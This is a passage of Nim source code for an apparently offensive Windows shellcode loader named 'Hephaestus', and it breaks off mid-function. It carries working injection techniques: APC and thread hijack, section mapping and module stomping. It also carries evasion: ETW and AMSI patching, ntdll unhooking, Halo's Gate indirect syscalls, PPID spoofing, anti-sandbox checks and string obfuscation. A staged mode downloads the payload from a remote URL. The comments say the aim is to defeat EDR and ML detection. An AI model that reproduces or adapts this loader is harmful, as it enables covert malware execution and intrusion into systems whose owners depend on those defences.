# Hephaestus shellcode loader
# Wraps Aphrodite (donut shellcode) with injection + evasion features.
# Compiled by builder.py via nim c --os:windows --cpu:amd64 -d:mingw --mm:arc --opt:speed
#
# Feature flags (passed as -d: at compile time):
#   useRc4          : RC4 decrypt payload before injection
#   useXor          : XOR decrypt payload before injection
#   sandboxCheck    : basic anti-sandbox (uptime, RAM, CPU, sleep skipping)
#   etwPatch        : patch EtwEventWrite -> xor eax,eax; ret
#   amsiPatch       : patch AmsiScanBuffer -> xor eax,eax; ret
#   ppidSpoof       : spawn target as child of explorer.exe
#   threadHijack    : RIP redirect instead of Early Bird APC
#   wipe            : zero shellcode buffer after injection
#   mapInject       : use NtCreateSection+NtMapViewOfSection instead of VirtualAllocEx
#                     (avoids NtAllocateVirtualMemory ETW MWTI telemetry - backed section)
#   moduleStomping  : overwrite the .text of an existing loaded DLL instead of allocating
#                     new memory — the region is "backed" by a file on disk, removing the
#                     memory_region.mapped_file==null / Unbacked trigger in Elastic rules
#   haloGate        : Halo's Gate SSN resolver + indirect NtSetContextThread via a
#                     syscall;ret gadget inside ntdll.dll — survives EDR userland hooks
#   strObf          : XOR-obfuscate API name strings at compile time

import std/base64
import winim/lean
import winim/inc/tlhelp32
import keys

# ---------------------------------------------------------------------------
# Compile-time string obfuscation for API names
# When -d:strObf is set, all API name literals are XOR'd at compile time so
# neither "VirtualAllocEx" nor "WriteProcessMemory" etc. appear in plaintext.
# ---------------------------------------------------------------------------
when defined(strObf):
  func xobfK(i: int): byte {.inline.} =
    byte(0x5B xor ((i * 13 + 17) and 0xFF))

  func xobfEnc(s: static string): seq[byte] {.compileTime.} =
    result = newSeq[byte](s.len)
    for i in 0..<s.len:
      result[i] = byte(s[i]) xor xobfK(i)

  proc xobfDec(data: seq[byte]): string {.inline.} =
    result = newString(data.len)
    for i in 0..<data.len:
      result[i] = char(data[i] xor xobfK(i))

  template apiName(s: static string): cstring =
    const encoded = xobfEnc(s)
    xobfDec(encoded).cstring
else:
  template apiName(s: static string): cstring = cstring(s)

# ---------------------------------------------------------------------------
# Extra WinAPI declarations not always in winim/lean
# ---------------------------------------------------------------------------
type
  STARTUPINFOEXW {.pure.} = object
    StartupInfo: STARTUPINFOW
    lpAttributeList: pointer

const
  EXTENDED_STARTUPINFO_PRESENT* = DWORD(0x00080000)
  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)

proc InitializeProcThreadAttributeList(
  lpAttrList: pointer, dwAttrCount: DWORD,
  dwFlags: DWORD, lpSize: ptr SIZE_T
): WINBOOL {.importc, stdcall, dynlib: "kernel32".}

proc UpdateProcThreadAttribute(
  lpAttrList: pointer, dwFlags: DWORD, Attribute: DWORD_PTR,
  lpValue: pointer, cbSize: SIZE_T,
  lpPreviousValue: pointer, lpReturnSize: ptr SIZE_T
): WINBOOL {.importc, stdcall, dynlib: "kernel32".}

proc DeleteProcThreadAttributeList(
  lpAttrList: pointer
) {.importc, stdcall, dynlib: "kernel32".}

# ---------------------------------------------------------------------------
# Dynamic kernel32 resolution — keeps offensive APIs out of the static IAT.
# The ML model (endpointpe-v4) heavily weights the combination of
# VirtualAllocEx + WriteProcessMemory + VirtualProtectEx in the import table.
# ---------------------------------------------------------------------------
type
  FnVirtualAllocEx = proc(
    hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
    flAllocationType: DWORD, flProtect: DWORD
  ): LPVOID {.stdcall.}

  FnWriteProcessMemory = proc(
    hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: pointer,
    nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T
  ): WINBOOL {.stdcall.}

  FnVirtualProtectEx = proc(
    hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
    flNewProtect: DWORD, lpflOldProtect: PDWORD
  ): WINBOOL {.stdcall.}

var
  pVirtualAllocEx:     FnVirtualAllocEx     = nil
  pWriteProcessMemory: FnWriteProcessMemory = nil
  pVirtualProtectEx:   FnVirtualProtectEx   = nil

when defined(threadHijack):
  type
    FnGetThreadContext = proc(hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
    FnSetThreadContext = proc(hThread: HANDLE, lpContext: ptr CONTEXT): WINBOOL {.stdcall.}
  var
    pGetThreadContext: FnGetThreadContext = nil
    pSetThreadContext: FnSetThreadContext = nil

# ReadProcessMemory and CreateRemoteThread are needed by moduleStomping.
when defined(moduleStomping):
  type
    FnReadProcessMemory = proc(
      hProcess: HANDLE, lpBaseAddress: LPVOID,
      lpBuffer: pointer, nSize: SIZE_T,
      lpNumberOfBytesRead: ptr SIZE_T
    ): WINBOOL {.stdcall.}
    FnCreateRemoteThread = proc(
      hProcess: HANDLE, lpThreadAttributes: pointer, dwStackSize: SIZE_T,
      lpStartAddress: pointer, lpParameter: LPVOID,
      dwCreationFlags: DWORD, lpThreadId: ptr DWORD
    ): HANDLE {.stdcall.}
  var pReadProcessMemory: FnReadProcessMemory = nil
  var pCreateRemoteThread: FnCreateRemoteThread = nil

# ---------------------------------------------------------------------------
# Payload: embedded (base64) in default mode, downloaded at runtime in staged
# ---------------------------------------------------------------------------
when not defined(staged):
  const encPayloadB64 = staticRead("payload.b64")

when defined(staged):
  # Staged loading: shellcode downloaded at runtime from stagingUrl.
  # The binary contains no payload at all, eliminating high-entropy sections
  # and dramatically reducing the ML detection surface.
  const
    INET_PRECONFIG : uint32 = 0x00000000'u32
    INET_RELOAD    : uint32 = 0x80000000'u32
    INET_NOCACHE   : uint32 = 0x04000000'u32
    INET_PRAGMA    : uint32 = 0x00000100'u32
    INET_NOUI      : uint32 = 0x00000200'u32

  type HInet = pointer

  proc inetOpen(agent: cstring, accessType: uint32,
                proxy: cstring, bypass: cstring, flags: uint32): HInet
    {.importc: "InternetOpenA", stdcall, dynlib: "wininet".}

  proc inetOpenUrl(hNet: HInet, url: cstring, headers: cstring,
                   headersLen: uint32, flags: uint32, ctx: uint): HInet
    {.importc: "InternetOpenUrlA", stdcall, dynlib: "wininet".}

  proc inetRead(hUrl: HInet, buf: pointer, toRead: uint32, nRead: ptr uint32): int32
    {.importc: "InternetReadFile", stdcall, dynlib: "wininet".}

  proc inetClose(h: HInet): int32
    {.importc: "InternetCloseHandle", stdcall, dynlib: "wininet".}

  proc downloadStage(): seq[byte] =
    let agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    let hNet = inetOpen(agent.cstring, INET_PRECONFIG,
                        cast[cstring](nil), cast[cstring](nil), 0'u32)
    if hNet == nil: return @[]
    defer: discard inetClose(hNet)

    let dlFlags = INET_RELOAD or INET_NOCACHE or INET_PRAGMA or INET_NOUI
    let hUrl = inetOpenUrl(hNet, stagingUrl.cstring, cast[cstring](nil),
                           0'u32, dlFlags, 0'u)
    if hUrl == nil: return @[]
    defer: discard inetClose(hUrl)

    var data = newSeq[byte](0)
    var chunk: array[8192, byte]
    var nRead: uint32 = 0
    while true:
      if inetRead(hUrl, addr chunk[0], uint32(sizeof(chunk)), addr nRead) == 0: break
      if nRead == 0: break
      let pos = data.len
      data.setLen(data.len + int(nRead))
      copyMem(addr data[pos], addr chunk[0], int(nRead))
    return data

# ---------------------------------------------------------------------------
# Dynamic ntdll resolution: no suspicious IAT entries for syscalls
# ---------------------------------------------------------------------------
when not defined(threadHijack):
  type FnNtQueueApcThread = proc(
    ThreadHandle: HANDLE, ApcRoutine: LPVOID,
    ApcArgument1, ApcArgument2, ApcArgument3: LPVOID
  ): LONG {.stdcall.}

  var pNtQueueApcThread: FnNtQueueApcThread = nil

when defined(mapInject):
  type NTSTATUS = LONG

  const
    SECTION_ALL_ACCESS_FLAG = DWORD(0x000F001F)
    SEC_COMMIT_FLAG         = DWORD(0x8000000)
    STATUS_SUCCESS_NT       = NTSTATUS(0)
    ViewUnmap               = DWORD(2)

  type
    FnNtCreateSection = proc(
      SectionHandle: ptr HANDLE, DesiredAccess: DWORD,
      ObjectAttributes: pointer, MaximumSize: ptr int64,
      SectionPageProtection: DWORD, AllocationAttributes: DWORD,
      FileHandle: HANDLE
    ): NTSTATUS {.stdcall.}

    FnNtMapViewOfSection = proc(
      SectionHandle: HANDLE, ProcessHandle: HANDLE,
      BaseAddress: ptr LPVOID, ZeroBits: uint,
      CommitSize: SIZE_T, SectionOffset: pointer,
      ViewSize: ptr SIZE_T, InheritDisposition: DWORD,
      AllocationType: DWORD, Win32Protect: DWORD
    ): NTSTATUS {.stdcall.}

    FnNtUnmapViewOfSection = proc(
      ProcessHandle: HANDLE, BaseAddress: LPVOID
    ): NTSTATUS {.stdcall.}

  var pNtCreateSection:      FnNtCreateSection      = nil
  var pNtMapViewOfSection:   FnNtMapViewOfSection   = nil
  var pNtUnmapViewOfSection: FnNtUnmapViewOfSection = nil

  proc mapViewInject(hProcess: HANDLE, sc: seq[byte]): LPVOID =
    var hSec: HANDLE = 0
    var sz = int64(sc.len)
    if pNtCreateSection(addr hSec, SECTION_ALL_ACCESS_FLAG, nil, addr sz,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT_FLAG,
                        HANDLE(0)) != STATUS_SUCCESS_NT:
      return nil
    defer: CloseHandle(hSec)

    var localBase: LPVOID = nil
    var viewSz: SIZE_T = 0
    if pNtMapViewOfSection(hSec, GetCurrentProcess(), addr localBase, 0, 0, nil,
                           addr viewSz, ViewUnmap, 0,
                           PAGE_READWRITE) != STATUS_SUCCESS_NT:
      return nil

    copyMem(localBase, unsafeAddr sc[0], sc.len)
    discard pNtUnmapViewOfSection(GetCurrentProcess(), localBase)

    var remoteBase: LPVOID = nil
    viewSz = 0
    if pNtMapViewOfSection(hSec, hProcess, addr remoteBase, 0, 0, nil,
                           addr viewSz, ViewUnmap, 0,
                           PAGE_EXECUTE_READ) != STATUS_SUCCESS_NT:
      return nil

    return remoteBase

# ---------------------------------------------------------------------------
# Module stomping: inject into a loaded DLL's .text instead of new memory.
#
# Why this defeats Elastic's "Unbacked" rules:
#   VirtualAllocEx / NtAllocateVirtualMemory creates Private anonymous pages.
#   Elastic flags them as Unbacked (memory_region.mapped_file == null).
#   A DLL's .text section is a file-backed mapped region → not Unbacked.
#   After stomping, MWTI/Sysmon see the thread start address pointing into
#   a legitimate PE on disk → alert suppressed.
#
# Safe targets: freshly-suspended processes (CREATE_SUSPENDED) have all DLLs
# loaded but no user code running yet, so a rarely-called DLL can be stomped
# safely before ResumeThread. Preferred targets (wldp.dll, rpcrt4.dll, …)
# have large .text sections and are rarely executed post-init.
# ---------------------------------------------------------------------------
when defined(moduleStomping):
  proc findRemoteTextSection(hProcess: HANDLE, modBase: LPVOID,
                              outAddr: var LPVOID, outSize: var SIZE_T): bool =
    var dosHdr: IMAGE_DOS_HEADER
    var nr: SIZE_T
    if pReadProcessMemory(hProcess, modBase,
                          addr dosHdr, SIZE_T(sizeof(dosHdr)), addr nr) == 0:
      return false
    let ntHdrPtr = cast[LPVOID](cast[uint](modBase) + uint(dosHdr.e_lfanew))
    var ntHdr: IMAGE_NT_HEADERS64
    if pReadProcessMemory(hProcess, ntHdrPtr,
                          addr ntHdr, SIZE_T(sizeof(ntHdr)), addr nr) == 0:
      return false
    let sectOff = 4 + sizeof(IMAGE_FILE_HEADER) +
                  int(ntHdr.FileHeader.SizeOfOptionalHeader)
    let firstSectPtr = cast[LPVOID](cast[uint](ntHdrPtr) + uint(sectOff))
    for i in 0..<int(ntHdr.FileHeader.NumberOfSections):
      var sec: IMAGE_SECTION_HEADER
      let secPtr = cast[LPVOID](cast[uint](firstSectPtr) +
                                uint(i * sizeof(IMAGE_SECTION_HEADER)))
      if pReadProcessMemory(hProcess, secPtr,
                             addr sec, SIZE_T(sizeof(sec)), addr nr) == 0:
        continue
      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
         sec.Name[4] == byte('t'):
        outAddr = cast[LPVOID](cast[uint](modBase) + uint(sec.VirtualAddress))
        outSize = SIZE_T(sec.Misc.VirtualSize)
        return true
    return false

  proc moduleStompInject(hProcess: HANDLE, pid: DWORD, sc: seq[byte]): LPVOID =
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, pid)
    if snap == INVALID_HANDLE_VALUE: return nil
    defer: CloseHandle(snap)

    # Never stomp these: process will crash without them
    const skipList = ["ntdll.dll", "kernel32.dll", "kernelbase.dll",
                      "user32.dll", "win32u.dll", "wow64.dll"]
    # Preferred targets: large .text, rarely called after DllMain
    const preferList = ["rpcrt4.dll", "combase.dll", "wldp.dll",
                        "clbcatq.dll", "wintrust.dll", "xolehlp.dll",
                        "cryptbase.dll", "profext.dll"]

    var me32: MODULEENTRY32W
    me32.dwSize = DWORD(sizeof(me32))

    # Pick the largest .text that fits the shellcode (preferred DLLs win ties).
    var candidate: LPVOID = nil
    var candSize: SIZE_T = 0
    var candPref = false

    if Module32FirstW(snap, addr me32) == 0: return nil
    while true:
      # Build lowercase module name from wide chars
      var name = ""
      var k = 0
      while me32.szModule[k] != 0 and k < MAX_MODULE_NAME32:
        let c = me32.szModule[k]
        name.add(char(if c >= 65 and c <= 90: c + 32 else: c))
        inc k

      var doSkip = false
      for s in skipList:
        if name == s: doSkip = true; break

      if not doSkip:
        var textAddr: LPVOID = nil
        var textSize: SIZE_T = 0
        if findRemoteTextSection(hProcess, cast[LPVOID](me32.modBaseAddr),
                                  textAddr, textSize):
          if int(textSize) >= sc.len:
            var isPref = false
            for p in preferList:
              if name == p: isPref = true; break
            let take = candidate == nil or
                       (isPref and not candPref) or
                       (isPref == candPref and textSize > candSize)
            if take:
              candidate = textAddr
              candSize  = textSize
              candPref  = isPref

      if Module32NextW(snap, addr me32) == 0: break

    if candidate == nil: return nil

    # RW -> write shellcode -> RX (never RWX, two separate VirtualProtectEx calls)
    var old: DWORD
    if pVirtualProtectEx(hProcess, candidate, SIZE_T(sc.len),
                          PAGE_READWRITE, addr old) == 0:
      return nil
    var written: SIZE_T = 0
    if pWriteProcessMemory(hProcess, candidate,
                           unsafeAddr sc[0], SIZE_T(sc.len), addr written) == 0:
      return nil
    if written != SIZE_T(sc.len): return nil
    var old2: DWORD
    if pVirtualProtectEx(hProcess, candidate, SIZE_T(sc.len),
                         PAGE_EXECUTE_READ, addr old2) == 0:
      return nil
    return candidate

  # Preload a large DLL into the target process so moduleStompInject has a
  # viable candidate. In CREATE_SUSPENDED processes only ntdll/kernel32/kernelbase
  # are present — all in the skip list. This forces a suitable DLL to be present.
  proc preloadDllInProcess(hProc: HANDLE, dllPath: cstring) =
    if pCreateRemoteThread == nil or pVirtualAllocEx == nil or
       pWriteProcessMemory == nil: return
    let pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                  apiName("LoadLibraryA"))
    if pLoadLib == nil: return
    let pathLen = len($dllPath)
    let sz = SIZE_T(pathLen + 1)
    let remBuf = pVirtualAllocEx(hProc, nil, sz, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if remBuf == nil: return
    var written: SIZE_T
    discard pWriteProcessMemory(hProc, remBuf, cast[pointer](dllPath), sz, addr written)
    let hThread = pCreateRemoteThread(hProc, nil, 0, pLoadLib, remBuf, 0, nil)
    if hThread != 0:
      discard WaitForSingleObject(hThread, 5000)
      discard CloseHandle(hThread)

# ---------------------------------------------------------------------------
# Halo's Gate: SSN resolver + indirect NtSetContextThread.
#
# How it works:
#   1. Parse the target ntdll stub for the "mov eax, <SSN>" opcode.
#      Normal stub: 4C 8B D1 B8 <ssn_lo> <ssn_hi> 00 00 0F 05 C3
#   2. If the stub is hooked (starts with JMP/MOV-to-hook), scan ±neighbours
#      in 32-byte steps (Nt* stubs are exactly 32 bytes apart in ntdll).
#      A clean neighbour's SSN differs from ours by exactly i positions.
#   3. Locate the first "syscall; ret" gadget (0F 05 C3) in ntdll .text.
#   4. Build an asmNoStackFrame stub that: sets eax=SSN, rearranges args for
#      the kernel ABI (r10=rcx), then calls the gadget indirectly.
#      Result: the kernel-visible RIP at the syscall transition is inside
#      ntdll.dll — identical to a legitimate call, invisible to CFG/CET checks.
# ---------------------------------------------------------------------------
when defined(haloGate):
  var gHaloGadget: pointer = nil
  var gSsnNtSetContextThread: uint32 = 0xFFFF'u32

  proc hgExtractSsn(p: ptr UncheckedArray[byte]): int {.inline.} =
    # Standard stub prologue: mov r10,rcx (4C 8B D1) then mov eax,SSN (B8 xx xx 00 00)
    if p[0] == 0x4C and p[1] == 0x8B and p[2] == 0xD1 and p[3] == 0xB8:
      return int(p[4]) or (int(p[5]) shl 8)
    return -1

  proc hgFindGadget(hNtdll: HANDLE): pointer =
    # Scan ntdll .text for the bytes: syscall(0F 05) ret(C3)
    let base   = cast[uint](hNtdll)
    let dos    = cast[ptr IMAGE_DOS_HEADER](base)
    let nt     = cast[ptr IMAGE_NT_HEADERS64](base + uint(dos.e_lfanew))
    let first  = cast[uint](nt) + 4 + uint(sizeof(IMAGE_FILE_HEADER)) +
                 uint(nt.FileHeader.SizeOfOptionalHeader)
    for i in 0..<int(nt.FileHeader.NumberOfSections):
      let sec = cast[ptr IMAGE_SECTION_HEADER](
        first + uint(i * sizeof(IMAGE_SECTION_HEADER)))
      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
         sec.Name[4] == byte('t'):
        let tStart = base + uint(sec.VirtualAddress)
        let tEnd   = tStart + uint(sec.Misc.VirtualSize)
        var p = tStart
        while p + 2 < tEnd:
          let b = cast[ptr array[3, byte]](p)
          if b[0] == 0x0F and b[1] == 0x05 and b[2] == 0xC3:
            return cast[pointer](p)
          inc p
        break
    return nil

  proc hgGetSsn(hNtdll: HANDLE, name: cstring): uint32 =
    let fn = GetProcAddress(hNtdll, name)
    if fn == nil: return 0xFFFF'u32
    let p = cast[ptr UncheckedArray[byte]](fn)

    let direct = hgExtractSsn(p)
    if direct >= 0: return uint32(direct)

    # Stub is hooked (e.g. starts with JMP/PUSH): scan neighbours ±32 bytes each
    let base = cast[uint](p)
    for i in 1..32:
      let pUp   = cast[ptr UncheckedArray[byte]](base + uint(i * 32))
      let upSsn = hgExtractSsn(pUp)
      if upSsn >= 0: return uint32(upSsn - i)

      let pDown   = cast[ptr UncheckedArray[byte]](base - uint(i * 32))
      let downSsn = hgExtractSsn(pDown)
      if downSsn >= 0: return uint32(downSsn + i)
    return 0xFFFF'u32

  # Indirect NtSetContextThread:
  #   Windows x64 ABI on entry: rcx=ssn, rdx=gadget, r8=hThread, r9=ctx
  #   We rearrange for kernel ABI:  eax=ssn, r10=rcx=hThread, rdx=ctx
  #   then call *gadget (which is: syscall; ret) — the syscall instruction
  #   executes inside ntdll.dll's address space, not in our loader.
  proc indirectNtSetContextThread(ssn: uint32, gadget: pointer,
                                   hThread: HANDLE,
                                   ctx: ptr CONTEXT): LONG {.asmNoStackFrame.} =
    # Windows x64 ABI on entry: rcx=ssn, rdx=gadget, r8=hThread, r9=ctx
    # Kernel ABI requires:       eax=SSN, r10=rcx=hThread, rdx=ctx
    # {.asmNoStackFrame.} emits raw AT&T asm — single % for register names.
    asm """
      movl %ecx, %eax
      movq %rdx, %r11
      movq %r8,  %rcx
      movq %r9,  %rdx
      movq %rcx, %r10
      callq *%r11
      ret
    """

# ---------------------------------------------------------------------------
# RC4
# ---------------------------------------------------------------------------
when defined(useRc4):
  proc rc4Crypt(key: openArray[byte], data: var openArray[byte]) =
    var S: array[256, byte]
    for i in 0..255: S[i] = byte(i)
    var j = 0
    for i in 0..255:
      j = (j + int(S[i]) + int(key[i mod key.len])) and 0xFF
      swap(S[i], S[j])
    var x, y = 0
    for i in 0..<data.len:
      x = (x + 1) and 0xFF
      y = (y + int(S[x])) and 0xFF
      swap(S[x], S[y])
      data[i] = data[i] xor S[(int(S[x]) + int(S[y])) and 0xFF]

# ---------------------------------------------------------------------------
# XOR
# ---------------------------------------------------------------------------
when defined(useXor):
  proc xorDecrypt(data: var openArray[byte]) =
    for i in 0..<data.len:
      data[i] = data[i] xor xorKey[i mod xorKey.len]

# ---------------------------------------------------------------------------
# Sandbox check
# ---------------------------------------------------------------------------
when defined(sandboxCheck):
  proc doSandboxCheck(): bool =
    if uint64(GetTickCount64()) < 300_000'u64: return false
    var ms: MEMORYSTATUSEX
    ms.dwLength = DWORD(sizeof(ms))
    if GlobalMemoryStatusEx(addr ms) != 0:
      if uint64(ms.ullTotalPhys) < 2'u64 * 1024 * 1024 * 1024: return false
    var si: SYSTEM_INFO
    GetSystemInfo(addr si)
    if si.dwNumberOfProcessors < 2: return false
    let t0 = uint64(GetTickCount64())
    Sleep(500)
    if uint64(GetTickCount64()) - t0 < 400'u64: return false
    return true

# ---------------------------------------------------------------------------
# ntdll unhook: remap .text from clean disk copy
# ---------------------------------------------------------------------------
when defined(unhook):
  proc unhookNtdll() =
    let hNtdll = GetModuleHandleA("ntdll.dll")
    if hNtdll == 0: return

    let hFile = CreateFileA(
      "C:\\Windows\\System32\\ntdll.dll",
      GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0
    )
    if hFile == INVALID_HANDLE_VALUE: return
    defer: CloseHandle(hFile)

    let hMap = CreateFileMappingA(hFile, nil, PAGE_READONLY or SEC_IMAGE, 0, 0, nil)
    if hMap == 0: return
    defer: CloseHandle(hMap)

    let pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)
    if pClean == nil: return
    defer: UnmapViewOfFile(pClean)

    let base = cast[int](hNtdll)
    let dos   = cast[ptr IMAGE_DOS_HEADER](base)
    let nt    = cast[ptr IMAGE_NT_HEADERS64](base + int(dos.e_lfanew))
    let firstSec = cast[int](nt) + 4 + sizeof(IMAGE_FILE_HEADER) +
                   int(nt.FileHeader.SizeOfOptionalHeader)

    for i in 0..<int(nt.FileHeader.NumberOfSections):
      let sec = cast[ptr IMAGE_SECTION_HEADER](
        firstSec + i * sizeof(IMAGE_SECTION_HEADER)
      )
      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
         sec.Name[4] == byte('t') and sec.Name[5] == byte(0):
        let textAddr = cast[LPVOID](base + int(sec.VirtualAddress))
        let textSize = SIZE_T(sec.Misc.VirtualSize)
        let cleanText = cast[LPVOID](cast[int](pClean) + int(sec.VirtualAddress))
        var old: DWORD
        if VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, addr old) != 0:
          copyMem(textAddr, cleanText, int(textSize))
          discard VirtualProtect(textAddr, textSize, old, addr old)
        break

# ---------------------------------------------------------------------------
# ETW patch (xor eax,eax; ret)
# ---------------------------------------------------------------------------
when defined(etwPatch):
  proc patchEtw() =
    let h = GetModuleHandleA("ntdll.dll")
    if h == 0: return
    let p = cast[LPVOID](GetProcAddress(h, "EtwEventWrite"))
    if p == nil: return
    var patch: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]
    var old: DWORD
    if VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, addr old) != 0:
      copyMem(p, addr patch[0], 3)
      discard VirtualProtect(p, 3, old, addr old)

# ---------------------------------------------------------------------------
# AMSI patch (xor eax,eax; ret)
# ---------------------------------------------------------------------------
when defined(amsiPatch):
  proc patchAmsi() =
    let h = LoadLibraryA("amsi.dll")
    if h == 0: return
    let p = cast[LPVOID](GetProcAddress(h, "AmsiScanBuffer"))
    if p == nil: return
    var patch: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]
    var old: DWORD
    if VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, addr old) != 0:
      copyMem(p, addr patch[0], 3)
      discard VirtualProtect(p, 3, old, addr old)

# ---------------------------------------------------------------------------
# Get explorer.exe PID for PPID spoof
# ---------------------------------------------------------------------------
when defined(ppidSpoof):
  proc getExplorerPid(): DWORD =
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE: return 0
    defer: CloseHandle(snap)
    var pe: PROCESSENTRY32W
    pe.dwSize = DWORD(sizeof(pe))
    if Process32FirstW(snap, addr pe) != 0:
      while true:
        var i = 0
        var name = ""
        while pe.szExeFile[i] != 0 and i < 260:
          name.add(char(pe.szExeFile[i]))
          inc i
        if name == "explorer.exe":
          return pe.th32ProcessID
        if Process32NextW(snap, addr pe) == 0: break
    return 0

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
when defined(debug):
  proc dbg(s: string) =
    writeLine(stdout, "[D] " & s)
    flushFile(stdout)
else:
  template dbg(s: string) = discard

proc hMain() =
  dbg("hMain start")

  when defined(sandboxCheck):
    if not doSandboxCheck():
      dbg("sandbox check failed - exiting")
      return

  when defined(unhook):
    dbg("unhooking ntdll")
    unhookNtdll()

  when defined(etwPatch):
    dbg("patching ETW")
    patchEtw()

  when defined(amsiPatch):
    dbg("patching AMSI")
    patchAmsi()

  # Resolve ntdll syscalls at runtime (absent from static IAT)
  let hNtdll = GetModuleHandleA("ntdll.dll")
  dbg("ntdll handle: " & $cast[uint](hNtdll))

  when not defined(threadHijack):
    pNtQueueApcThread = cast[FnNtQueueApcThread](
      GetProcAddress(hNtdll, apiName("NtQueueApcThread")))

  when defined(mapInject):
    pNtCreateSection = cast[FnNtCreateSection](
      GetProcAddress(hNtdll, apiName("NtCreateSection")))
    pNtMapViewOfSection = cast[FnNtMapViewOfSection](
      GetProcAddress(hNtdll, apiName("NtMapViewOfSection")))
    pNtUnmapViewOfSection = cast[FnNtUnmapViewOfSection](
      GetProcAddress(hNtdll, apiName("NtUnmapViewOfSection")))

  # Resolve offensive kernel32 APIs at runtime (not in static IAT)
  let hK32 = GetModuleHandleA("kernel32.dll")
  pVirtualAllocEx     = cast[FnVirtualAllocEx](
    GetProcAddress(hK32, apiName("VirtualAllocEx")))
  pWriteProcessMemory = cast[FnWriteProcessMemory](
    GetProcAddress(hK32, apiName("WriteProcessMemory")))
  pVirtualProtectEx   = cast[FnVirtualProtectEx](
    GetProcAddress(hK32, apiName("VirtualProtectEx")))

  when defined(threadHijack):
    pGetThreadContext = cast[FnGetThreadContext](
      GetProcAddress(hK32, apiName("GetThreadContext")))
    pSetThreadContext = cast[FnSetThreadContext](
      GetProcAddress(hK32, apiName("SetThreadContext")))

  when defined(moduleStomping):
    pReadProcessMemory = cast[FnReadProcessMemory](
      GetProcAddress(hK32, apiName("ReadProcessMemory")))
    pCreateRemoteThread = cast[FnCreateRemoteThread](
      GetProcAddress(hK32, apiName("CreateRemoteThread")))

  # Halo's Gate: resolve SSN for NtSetContextThread and locate the
  # syscall;ret gadget in ntdll .text for the indirect invocation path.
  when defined(haloGate):
    gSsnNtSetContextThread = hgGetSsn(hNtdll, apiName("NtSetContextThread"))
    gHaloGadget = hgFindGadget(hNtdll)

  # Load payload
  when defined(staged):
    dbg("downloading staged payload")
    var sc = downloadStage()
    dbg("downloaded " & $sc.len & " bytes")
    if sc.len == 0:
      dbg("download failed - exiting")
      return
    when defined(useRc4):
      dbg("RC4 decrypt")
      rc4Crypt(rc4Key, sc)
    elif defined(useXor):
      dbg("XOR decrypt")
      xorDecrypt(sc)
  else:
    let decoded = decode(encPayloadB64)
    var sc = newSeq[byte](decoded.len)
    for i in 0..<decoded.len:
      sc[i] = byte(decoded[i])
    when defined(useRc4):
      rc4Crypt(rc4Key, sc)
    elif defined(useXor):
      xorDecrypt(sc)

  # Pre-injection jitter: breaks the tight temporal correlation between
  # loader start and injection API calls that MWTI timestamps precisely.
  # Uses low bits of tick count as a cheap pseudo-random seed (300–1800 ms).
  let jitterMs = DWORD(300 + (uint64(GetTickCount64()) and 0x5FF))
  Sleep(jitterMs)

  # Prepare process creation
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = DWORD(sizeof(si))

  var target = newWideCString(targetProcess)

  when defined(ppidSpoof):
    var siex: STARTUPINFOEXW
    siex.StartupInfo = si
    siex.StartupInfo.cb = DWORD(sizeof(siex))

    var palSize: SIZE_T = 0
    discard InitializeProcThreadAttributeList(nil, 1, 0, addr palSize)
    var palBuf = newSeq[byte](int(palSize))
    let pal = cast[pointer](addr palBuf[0])

    if InitializeProcThreadAttributeList(pal, 1, 0, addr palSize) != 0:
      let epid = getExplorerPid()
      if epid != 0:
        let hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, epid)
        if hParent != 0:
          var ph = hParent
          discard UpdateProcThreadAttribute(
            pal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            addr ph, SIZE_T(sizeof(HANDLE)), nil, nil
          )
      siex.lpAttributeList = pal

    discard CreateProcessW(
      nil, target, nil, nil, FALSE,
      CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
      nil, nil, cast[LPSTARTUPINFOW](addr siex), addr pi
    )
    DeleteProcThreadAttributeList(pal)
  else:
    discard CreateProcessW(
      nil, target, nil, nil, FALSE,
      CREATE_SUSPENDED,
      nil, nil, addr si, addr pi
    )

  dbg("CreateProcessW result: hProcess=" & $cast[uint](pi.hProcess) & " hThread=" & $cast[uint](pi.hThread))
  if pi.hProcess == 0:
    dbg("CreateProcessW failed - exiting")
    return

  proc allocRemoteShellcode(hProc: HANDLE, pid: DWORD, payload: seq[byte]): LPVOID =
    when defined(moduleStomping):
      let stomped = moduleStompInject(hProc, pid, payload)
      if stomped != nil: return stomped
    when defined(mapInject):
      let mapped = mapViewInject(hProc, payload)
      if mapped != nil: return mapped
    var base = pVirtualAllocEx(
      hProc, nil, SIZE_T(payload.len),
      MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    )
    if base == nil: return nil
    var written: SIZE_T = 0
